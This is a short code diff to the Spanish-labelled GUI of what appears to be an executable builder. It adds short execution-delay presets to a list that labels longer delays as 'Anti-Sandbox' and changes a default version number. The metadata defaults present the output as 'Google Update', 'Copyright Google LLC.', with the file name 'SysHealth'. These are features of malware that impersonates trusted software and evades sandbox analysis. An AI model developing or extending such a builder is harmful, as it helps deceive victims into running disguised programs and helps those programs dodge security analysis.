@@ -58,6 +58,9 @@ class BuilderView(ctk.CTkScrollableFrame):
     # Opciones con notas de uso táctico
     DELAY_PRESETS = [
         "0 (Instantáneo - Riesgo Alto)",
+        "1 (Rápido - Estándar)",
+        "3 (Rápido - Estándar)",
+        "5 (Rápido - Estándar)",
         "10 (Básico - Estándar)",
         "30 (Recomendado - Equilibrio)",
         "60 (Seguro - Anti-Sandbox)",
@@ -163,7 +166,7 @@ class BuilderView(ctk.CTkScrollableFrame):
             ("Producto:",      "product",  "Google Update"),
             ("Copyright:",     "copyright","Copyright Google LLC."),
             ("Nombre EXE:",    "name",     "SysHealth"),
-            ("Versión:",       "version",  "1.2.0.0"),
+            ("Versión:",       "version",  "2.5.0"),
         ]
         self._meta_fields: dict[str, ctk.CTkEntry] = {}
         for i, (label, key, default) in enumerate(fields):
